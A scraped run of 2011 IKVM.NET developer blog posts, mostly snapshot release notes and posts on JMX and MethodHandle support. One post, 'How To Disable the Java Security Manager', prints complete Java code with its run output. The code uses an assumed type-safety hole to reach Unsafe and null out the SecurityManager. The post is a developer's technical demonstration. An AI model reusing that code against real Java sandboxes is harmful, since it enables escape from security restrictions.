		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b41e7d99-eef3-43dc-8169-ed20865067e6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b41e7d99-eef3-43dc-8169-ed20865067e6">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 07 October 2011</h2></div>
<div class="newsItems"><a name="ad1657f1b-8fcf-4710-8cba-599a79d62455"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Time for a new snapshot. With the (more or less) completion of java.nio.file the release is getting closer. There are still some minor issues, but the bulk of the work is now complete.</P>
<P>Changes:</P>
<UL>
<LI>Fixed ikvmstub to handle annotation defaults. 
<LI>Fixed ikvmc to generate (private) setter for final instance fields that get an access stub to support serialization and reflection. 
<LI>Runtime.exec() fix. When disambiguating executable names, we should only try to append .exe if the filename doesn't already contain a dot. 
<LI>Removed unnecessary link demand from MappedByteBuffer that caused problems when building for .NET 4.0. 
<LI>Fixed MethodHandle constructor invocation issue when running on .NET 4.0. 
<LI>Removed mapping of System.Security.VerificationException to java.lang.VerifyError. 
<LI>Fixed os.name and os.version system properties when running on unknown Windows version (Windows 8). 
<LI>Bug fix. IPInterfaceProperties.GetIPv_Properties() can throw an exception (and does so on Windows 8 for some interfaces). 
<LI>Fixed ikvmc to not open the remap file with write access. 
<LI>Implemented remaining java.nio.file functionality (minus most optional functionality and ACL support). 
<LI>IKVM.Reflection: Implemented ToString() for EventInfo and PropertyInfo. 
<LI>IKVM.Reflection: Copy all assembly flags when adding an assembly reference (WinRT fix). 
<LI>IKVM.Reflection: Added API extension to query and define custom attributes on interfaceimpl records. 
<LI>IKVM.Reflection: Added support for targetting ARM. 
<LI>IKVM.Reflection: Added ILGenerator.__StackHeight property API extension.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.0.4296.zip"><STRONG>ikvmbin-7.0.4296.zip</STRONG></A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/07/2011 12:38:26 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d1657f1b-8fcf-4710-8cba-599a79d62455"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d1657f1b-8fcf-4710-8cba-599a79d62455">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 06 September 2011</h2></div>
<div class="newsItems"><a name="ade7d267e-a9fd-43ea-a1b4-137f6648f75d"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Time for a new snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Enabled parallel class loading.</LI>
<LI>Fix ClassLoader.findLoadedClass0() to handle null string.</LI>
<LI>Fixed class loader to always check parent class loader for validity.</LI>
<LI>Implemented platform MBean server support (although with very limited information/exposed operations).</LI>
<LI>Fixed race condition in Thread.initContextClassLoader().</LI>
<LI>Updated StringHelper to OpenJDK 7.</LI>
<LI>Fixed field reflection not use "slow path" to get consistent exception behavior (accessing Throwable fields on non-Java exceptions is not supported).</LI>
<LI>Implemented Unsafe.defineClass().</LI>
<LI>Completed implementation of new Unsafe.copyMemory() overload. This fixes several direct ByteBuffer regressions (introduced when we started using OpenJDK 7).</LI>
<LI>Implemented SocketChannel.sendOutOfBandData().</LI>
<LI>Implemented DatagramChannel multicast methods.</LI>
<LI>Fix for #3404229.</LI>
<LI>Bug fix. Don't create a miranda method if the class already has a static method with the same signature.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.0.4266.zip">ikvmbin-7.0.4266.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/06/2011 12:07:48 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=de7d267e-a9fd-43ea-a1b4-137f6648f75d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=de7d267e-a9fd-43ea-a1b4-137f6648f75d">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 01 September 2011</h2></div>
<div class="newsItems"><a name="a221b5f1f-53f4-4720-9a0b-62896218987d"></a><div class="entry">
	<h3 class="entryTitle">Platform MBean Server</h3>
	<div class="entryBody">
		<A href="http://www.frijters.net/jconsole.png"><IMG border=0 hspace=10 vspace=10 align=right src="http://www.frijters.net/jconsole.png" width=200></A>
<P>The release notes for IKVM.NET have always said "Not implemented" for java.lang.management and javax.management. This was mostly due to the fact that I don't know very much about this area of Java and it doesn't make a lot of sense to use Java management tools when the equivalent .NET management tools are probably a better fit (at least for VM level operations).</P>
<P>This week, prompted by a question on the ikvm-developers list, I decided to look into improving the situation (a bit). As a result it is now possible to get the platform MBean server and to connect to it with the jconsole application.</P>
<P>To start the server run the following code:</P>
<P><CODE>java.lang.System.setProperty("com.sun.management.jmxremote", "true");<BR>java.lang.System.setProperty("com.sun.management.jmxremote.authenticate", "false");<BR>java.lang.System.setProperty("com.sun.management.jmxremote.ssl", "false");<BR>java.lang.System.setProperty("com.sun.management.jmxremote.port", "9999");<BR><BR>sun.management.Agent.startAgent();</CODE></P>
<P>Now when you start jconsole in the following way, you can connect to localhost:9999</P>
<P><CODE>jconsole -J-Dcom.sun.management.jmxremote.ssl=false</CODE></P>
<P>Note that the mechanism that jconsole uses to detect and connect to locally running JDK instances is very platform specific and is not supported. Note also that IKVM does not support "agents" , so you have to start the management agent explicitly by calling it directly.</P>
<P><STRONG>Limitations</STRONG></P>
<P>The information (and operations) exposed is pretty limited. I still maintain that using .NET specific management tools is a better solution, but if you have any specific scenario you want to see supported, please let me know and I'll consider it.</P>
<P><STRONG>Code</STRONG></P>
<P>If you want to play with it, the binaries are available here: <A href="http://www.frijters.net/ikvmbin-7.0.4261.zip">ikvmbin-7.0.4261.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/01/2011 11:16:57 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=221b5f1f-53f4-4720-9a0b-62896218987d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=221b5f1f-53f4-4720-9a0b-62896218987d">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 30 August 2011</h2></div>
<div class="newsItems"><a name="a86183f0f-9f93-4db4-89c8-f04fee2ad67e"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Time for a new snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Hardened runtime against asynchronous Thread.Abort() during critical operations. Fix for bug #3385353. Still not a good idea to do an asynchronous <A href="http://msdn.microsoft.com/en-us/library/ty8d3wta.aspx">Thread.Abort()</A> or <A href="http://download.oracle.com/javase/1.4.2/docs/guide/misc/threadPrimitiveDeprecation.html">Thread.stop()</A> though.</LI>
<LI>Fixed ikvmstub to export exceptions declared with ThrowsAttribute(Type) (in .NET code) properly.</LI>
<LI>Implemented some more java.nio.file APIs.</LI>
<LI>Merged OpenJDK 7 sun.nio.ch.FileChannelImpl changes.</LI>
<LI>Implemented positional read/write for FileChannel.</LI>
<LI>Fixed several FileChannel append issues.</LI>
<LI>Added more missing classes and resources.</LI>
<LI>Added back some rmi stubs that somehow got dropped during 6 -&gt; 7 transition.</LI>
<LI>Implemented AsynchronousFileChannel.</LI>
<LI>Implemented AsynchronousSocketChannel and AsynchronousServerSocketChannel.</LI>
<LI>Merged OpenJDK 7 sun.nio.ch.DatagramChannelImpl changes.</LI>
<LI>Implemented nio IPv6 support (Windows Vista and up only).</LI>
<LI>Implemented dual stack sockets (Windows Vista and up only).</LI>
<LI>JSR292 bug fix. If the bootstrap method throws an exception and the call signature has a non-void return type, we didn't generate the proper exception throwing stub.</LI>
<LI>JSR292 bug fix. Types need to be finished before they can be used in a DynamicMethod.</LI>
<LI>Verifier bug fix. Exception blocks inside potential try { } finally { } blocks were not handled correctly. Could result in finally blocks that run multiple times (when an exception occurs).</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.0.4258.zip">ikvmbin-7.0.4258.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/30/2011 07:36:16 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=86183f0f-9f93-4db4-89c8-f04fee2ad67e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=86183f0f-9f93-4db4-89c8-f04fee2ad67e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 16 August 2011</h2></div>
<div class="newsItems"><a name="aab282437-1672-4f2f-a160-24c0ab5bbb36"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>There's a working <A href="http://jcp.org/en/jsr/detail?id=292">JSR292</A> implementation now. No optimization work has been done yet, the first step is to get things working.</P>
<P>Changes:</P>
<UL>
<LI>Implemented JSR292.</LI>
<LI>Added missing classes &amp; resources.</LI>
<LI>Improved IKVM.Runtime.dll build script.</LI>
<LI>Support remap file &lt;throws /&gt; element for methods and constructors defined in remap file.</LI>
<LI>Added workaround for .NET 2.0 bug in Assembly.GetType() that caused runtime to incorrectly assume a proxy stub exists.</LI>
<LI>Changed ikvmstub to handle TypeLoadException in the same way as other exceptions.</LI>
<LI>Fixed bug in the compiler's handling of the "ldc <CLASS>" bytecode. Undersome conditions it would incorrectly optimize away the exception handler around it.</LI>
<LI>Added Kerberos support (on Windows). Based on patch submitted by Trevor Bell.</LI>
<LI>Bug fix. TypeWrapper.IsAssignableTo() didn't handle arrays with primitive elements properly.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.0.4245.zip">ikvmbin-7.0.4245.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/16/2011 10:35:23 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ab282437-1672-4f2f-a160-24c0ab5bbb36"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ab282437-1672-4f2f-a160-24c0ab5bbb36">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 08 August 2011</h2></div>
<div class="newsItems"><a name="af68aa0fb-9447-4aa5-8036-6415adf6fb02"></a><div class="entry">
	<h3 class="entryTitle">MethodHandle From C#</h3>
	<div class="entryBody">
		<P><CODE><SPAN style="COLOR: blue">using</SPAN> java.lang.invoke;<BR><BR><SPAN style="COLOR: blue">class</SPAN> <SPAN style="COLOR: #2b91af">Program</SPAN> {<BR>&nbsp; <SPAN style="COLOR: blue">static void</SPAN> Main() {<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: #2b91af">MethodType</SPAN> mt = <SPAN style="COLOR: #2b91af">MethodType</SPAN>.methodType(<SPAN style="COLOR: blue">typeof</SPAN>(<SPAN style="COLOR: blue">void</SPAN>), <SPAN style="COLOR: blue">typeof</SPAN>(<SPAN style="COLOR: blue">string</SPAN>), <SPAN style="COLOR: blue">typeof</SPAN>(<SPAN style="COLOR: blue">object</SPAN>[]));<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: #2b91af">MethodHandle</SPAN> mh = <SPAN style="COLOR: #2b91af">MethodHandles</SPAN>.lookup().findStatic(<SPAN style="COLOR: blue">typeof</SPAN>(System.<SPAN style="COLOR: #2b91af">Console</SPAN>), <SPAN style="COLOR: #a31515">"WriteLine"</SPAN>, mt);<BR>&nbsp;&nbsp;&nbsp; mh.invoke(<SPAN style="COLOR: #a31515">"{0} {1}"</SPAN>, <SPAN style="COLOR: #a31515">"Hello"</SPAN>, <SPAN style="COLOR: #a31515">"World"</SPAN>);<BR>&nbsp; }<BR>}</CODE></P>
<P>This now works, but it is not very efficient. Invoking a MethodHandle from Java is more efficient, because the call site signature is statically known in that case.</P>
<P>You can also call invokeExact from C#, but that's even less usefull, because (unlike from Java) you can only call MethodHandles with the same signature as invokeExact. However, it is very fast, because it doesn't do any conversions.</P>
<P>If there is demand for it, I'll consider adding a public API for getting the delegate from a MethodHandle.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/08/2011 11:26:45 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f68aa0fb-9447-4aa5-8036-6415adf6fb02"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f68aa0fb-9447-4aa5-8036-6415adf6fb02">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 05 August 2011</h2></div>
<div class="newsItems"><a name="a376e2d0f-d206-440e-9cdf-3cc2d593dae1"></a><div class="entry">
	<h3 class="entryTitle">MethodHandle Progress</h3>
	<div class="entryBody">
		<P>I've been working on JSR-292 and in particular <A href="http://download.oracle.com/javase/7/docs/api/java/lang/invoke/MethodHandle.html">MethodHandle</A> support the past week. It's been fun and I only found a single CLR bug so far, so I guess that's not too bad.</P>
<P>In the implementation of MethodHandle I use lots of delegates and DynamicMethods. When you generate invalid CIL for a DynamicMethod fun stuff happens, e.g. helpful exceptions, unhelpful exceptions, crashes or this interesting message:</P>
<P>====WARNING====<BR>You have probably encountered known bug VSW:137474, which fires<BR>when System.EnterpriseServices.Thunk.Proxy::LazyRegister is jitted.<BR>The bug often shows up in tests under ManagedServices\Interop.<BR>VSW:137474 has been fixed, but the fix has not yet been propagated<BR>to Lab21S. Please check to see if the assert/AV occurs while<BR>compiling LazyRegister before entering a new bug for this failure.<BR>=============== </P>
<P>The JIT just prints this to the console and continues on!</P>
<P>The <A href="http://hg.openjdk.java.net/jdk7/jdk7/jdk/file/9b8c96f96a0f/test/java/lang/invoke/">OpenJDK java.lang.invoke package tests</A> now pass on my systems with only 3 failures and they are all well understood. The first is due to invokedynamic not being implemented yet and the other two due the fact that I have not yet implement full variable arity delegates. Currently there are about 44 delegates for the arities from 0 to 21 (unfortunately you can't use System.Void as a generic type parameter, so you need special ones for void signatures).</P>
<P>Eventually I'll have fewer delegate types and use a tuple like value type to pack arguments together. The JVM only support 256 arguments so 8 x 8 x 8 should be enough.</P>
<P>The code is still very rough, so it'll probably be at least another week before anything is ready to check in or release a development snapshot.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/05/2011 16:45:51 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=376e2d0f-d206-440e-9cdf-3cc2d593dae1"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=376e2d0f-d206-440e-9cdf-3cc2d593dae1">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 01 August 2011</h2></div>
<div class="newsItems"><a name="a4527a953-90d5-4b87-bd93-90f71690142a"></a><div class="entry">
	<h3 class="entryTitle">How To Disable the Java Security Manager</h3>
	<div class="entryBody">
		<p>Suppose you have a type safety vulnerability in Java, you could use it to execute native code, but you can also simply disable the SecurityManager:</p>
<code>import java.io.*;<br />
import java.lang.ref.*;<br />
import java.lang.reflect.*;<br />
<br />
class Union1 {<br />
&nbsp; ObjectStreamClass osc;<br />
&nbsp; Class c;<br />
&nbsp; AccessibleObject acc;<br />
}<br />
<br />
class Union2 {<br />
&nbsp; MyObjectStreamClass osc;<br />
&nbsp; MyClass c;<br />
&nbsp; MyAccessibleObject acc;<br />
}<br />
<br />
class MyObjectStreamClass {<br />
&nbsp; int i1;<br />
&nbsp; int i2;<br />
&nbsp; int i3;<br />
&nbsp; int i4;<br />
&nbsp; Object obj1;<br />
&nbsp; Object obj2;<br />
&nbsp; Long suid;<br />
}<br />
<br />
class MyClass {<br />
&nbsp; int i1;<br />
&nbsp; int i2;<br />
&nbsp; int i3;<br />
&nbsp; int i4;<br />
&nbsp; Object obj1;<br />
&nbsp; Object obj2;<br />
&nbsp; Object obj3;<br />
&nbsp; Object obj4;<br />
&nbsp; SoftReference&lt;Field[]&gt; declaredFields;<br />
&nbsp; Object obj6;<br />
&nbsp; SoftReference&lt;Method[]&gt;
declaredMethods;<br />
&nbsp; Object obj8;<br />
}<br />
<br />
class MyAccessibleObject {<br />
&nbsp; boolean override;<br />
}<br />
<br />
class DisableSecurityManager {<br />
&nbsp; static Union1 u1 = new Union1();<br />
&nbsp; static Union2 
u2;<br />
&nbsp; static Method privateGetDeclaredFields;<br />
&nbsp; static Method 
privateGetDeclaredMethods;<br />
<br />
&nbsp; public static void main(String[] args) throws 
Exception {<br />
&nbsp;&nbsp;&nbsp; u2 = TypeSafetyHole.setupUnions(u1);<br />
&nbsp;&nbsp;&nbsp; disableSecurityManager();<br />
&nbsp; }<br />
<br />
&nbsp; 
static void disableSecurityManager() throws Exception {<br />
&nbsp;&nbsp;&nbsp; initReflection();<br />
<br />
&nbsp;&nbsp;&nbsp; Object 
unsafe = getField(java.util.Random.class, &quot;unsafe&quot;).get(null);<br />
&nbsp;&nbsp;&nbsp; Method 
staticFieldBase = getMethod(unsafe.getClass(), &quot;staticFieldBase&quot;);<br />
&nbsp;&nbsp;&nbsp; Method 
staticFieldOffset = getMethod(unsafe.getClass(), &quot;staticFieldOffset&quot;);<br />
&nbsp;&nbsp;&nbsp; Object 
base_System = staticFieldBase.invoke(unsafe, System.class);<br />
&nbsp;&nbsp;&nbsp; Method getObject = 
getMethod(unsafe.getClass(), &quot;getObjectVolatile&quot;);<br />
&nbsp;&nbsp;&nbsp; Method putObject = 
getMethod(unsafe.getClass(), &quot;putObjectVolatile&quot;);<br />
<br />
&nbsp;&nbsp;&nbsp; SecurityManager sm = 
System.getSecurityManager();<br />
&nbsp;&nbsp;&nbsp; System.out.println(sm);<br />
&nbsp;&nbsp;&nbsp; for (int i = 0; ; i += 4) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
if (getObject.invoke(unsafe, base_System, i) == sm) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(&quot;found 
it!&quot;);<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; putObject.invoke(unsafe, base_System, i, null);<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; 
System.out.println(System.getSecurityManager());<br />
&nbsp; }<br />
<br />
&nbsp; static void initReflection() 
throws Exception {<br />
&nbsp;&nbsp;&nbsp; u1.osc = ObjectStreamClass.lookup(Class.class);<br />
&nbsp;&nbsp;&nbsp; u1.c = 
Class.class;<br />
&nbsp;&nbsp;&nbsp; 
System.out.println(ObjectStreamClass.lookup(Class.class).getSerialVersionUID());<br />
&nbsp;&nbsp;&nbsp; 
u2.osc.suid = null;<br />
&nbsp;&nbsp;&nbsp; 
System.out.println(ObjectStreamClass.lookup(Class.class).getSerialVersionUID());<br />
&nbsp;&nbsp;&nbsp; 
for (Method m : u2.c.declaredMethods.get()) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if 
(m.getName().equals(&quot;privateGetDeclaredFields&quot;)) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u1.acc = m;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u2.acc.override = 
true;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; privateGetDeclaredFields = m;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if 
(m.getName().equals(&quot;privateGetDeclaredMethods&quot;)) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u1.acc = m;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u2.acc.override 
= true;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; privateGetDeclaredMethods = m;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp; }<br />
<br />
&nbsp; static Field getField(Class c, 
String name) throws Exception {<br />
&nbsp;&nbsp;&nbsp; Field[] fields = 
(Field[])privateGetDeclaredFields.invoke(c, false);<br />
&nbsp;&nbsp;&nbsp; for (Field f : fields) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if 
(f.getName().equals(name)) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u1.acc = f;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u2.acc.override = true;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return f;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; 
throw new Error(&quot;Field not found&quot;);<br />
&nbsp; }<br />
<br />
&nbsp; static Method getMethod(Class c, String 
name) throws Exception {<br />
&nbsp;&nbsp;&nbsp; Method[] methods = 
(Method[])privateGetDeclaredMethods.invoke(c, false);<br />
&nbsp;&nbsp;&nbsp; for (Method m : methods) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
if (m.getName().equals(name)) {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u1.acc = m;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u2.acc.override = true;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return m;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; 
}<br />
&nbsp;&nbsp;&nbsp; throw new Error(&quot;Method not found&quot;);<br />
&nbsp; }<br />
} &nbsp;</code>
<p>This code requires JDK 7. Note that you can&#39;t use reflection to access the
<a href="http://hg.openjdk.java.net/jdk7/jdk7/jdk/file/9b8c96f96a0f/src/share/classes/java/lang/System.java">
System.security</a> field, because it is <a href="http://hg.openjdk.java.net/jdk7/jdk7/jdk/file/9b8c96f96a0f/src/share/classes/sun/reflect/Reflection.java">special 
cased by the reflection code</a> (cute, but not very effective).</p>
<p>Here&#39;s how it runs (given a suitable implementation of TypeSafetyHole):</p>
<div style="background-color: Black; color: #e0e0e0"><code>C:\j&gt;\jdk1.7\bin\java -Djava.security.manager DisableSecurityManager<br />
3206093459760846163<br />
5184993009896724798<br />
java.lang.SecurityManager@150ac9a8<br />
found 
it!<br />
null</code></div>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/01/2011 16:27:17 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4527a953-90d5-4b87-bd93-90f71690142a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4527a953-90d5-4b87-bd93-90f71690142a">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="a897f3cb2-9c9b-40c9-a9d7-c72a1a6d44a7"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>After a massive amount of work, we finally have a new development snapshot based on OpenJDK 7 b147. There is still a lot of work to do to implement all the new functionality, but at least all the OpenJDK code has now been integrated.</P>
<P>There should not be any major regressions, but if you run into any (that isn't caused by an ikvm.internal.NotYetImplementedError or System.NotImplementedException) please let us know.</P>
<P>Missing:</P>
<UL>
<LI>IPv6 support is still at 0.46 level. 
<LI>JSR-292: Only MethodHandle.invokeExact support has been implemented. Mostly untested. 
<LI>Parallel class loading support not yet implemented. 
<LI>java.nio.file: Standard file system incomplete. 
<LI>java.nio.channels.AsynchronousFileChannel not yet implemented. </LI></UL>
<P>Changes:</P>
<UL>
<LI>Integrated OpenJDK 7 b147. 
<LI>New version numbering scheme: 7.0.@BUILD@.0. 
<LI>Added ikvmc -warnaserror option (which turns all warnings into errors, as opposed to the already existing option -warnaserror: to turn specific warnings into errors). 
<LI>Added -warnaserror to the IKVM.OpenJDK.*.dll builds. 
<LI>Changed ikvmc not to stop on the first error encountered. Keep going until 100 errors. Note that there still are a bunch of immediately fatal errors. 
<LI>Fixed java.io.FileOutputStream in append mode to use atomic append. 
<LI>Fixed java.util.zip to support files larger than 2GB and added Zip64 support. 
<LI>Made sun.misc.Unsafe.ensureClassInitialized() into an intrinsic. 
<LI>Extended map file support for ldtoken opcode to support loading method and field tokens. 
<LI>Fixed Thread.isCCLOverridden() bug. If the [g|s]etContextClassLoader() methods were not JITted before isCCLOverridden(), ldftn would return the JIT stub address and the vtable could contain the JITted method address. 
<LI>Added -Xnoglobbing option to ikvm.exe. 
<LI>Added a new (additional) naming scheme for "managed JNI" method container classes that avoids all the name collisions. 
<LI>Moved java.awt.AWTPermission into SwingAWT assembly. 
<LI>Added map file support for opcodes: ldarg_s, or, xor, not. 
<LI>Fixed I18N system properties (user.language, user.country, user.variant and user.script). 
<LI>Set sun.java.command and sun.java.launcher properties in ikvm.exe. 
<LI>Added missing lib/ext resources.
<LI>Fixed ikvmstub compatibility with&nbsp;newer versions of ICSharpCode.SharpZipLib.dll which require the ZipEntry size to be set explicitly, otherwise the generated archive will not be compatible with older zip implementations (like Java 6's java.util.zip).
<LI>Fixed serialization interop bug that could cause ArrayIndexOutOfBoundsException to be thrown while writing.
<LI>Fixed a serialization interop bug. If an object is a subclass of a class that has readResolve() method, but the subclass doesn't have a readResolve(), we should not call the base class readResolve().
<LI>Bug fix. When an abstract .NET type implements System.IComparable (and hence java.lang.Comparable) the resulting stub is not usable from Java because the compareTo method is missing. This fix adds the missing method.
<LI>Added support for declaring exceptions on shadow interface methods.
<LI>Fix and enhancement. When a .NET type implements a shadowed interface, we now also publish the original interface (e.g. if the .NET type implements System.IComparable, Java code will now see java.lang.Comparable and System.IComparable). In addition, the new code makes sure that when a .NET type explicitly implements both System.IComparable and java.lang.Comparable that the Java code will not see java.lang.Comparable twice.
<LI>Include OpenJDK 7 java.lang.AutoCloseable interface and make it shadow System.IDisposable. Removed java.io.Closeable special casing to support IDisposable (now automatic because Closeable extends AutoCloseable).
<LI>IKVM.Reflection: Fixed CliHeader read bug. Thanks to Oleg Mihailik for reporting this. </LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.0.4230.zip">ikvmbin-7.0.4230.zip</A><BR>OpenJDK 7 sources: <A href="http://www.frijters.net/openjdk7-b147-stripped.zip">openjdk7-b147-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/01/2011 11:53:21 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=897f3cb2-9c9b-40c9-a9d7-c72a1a6d44a7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
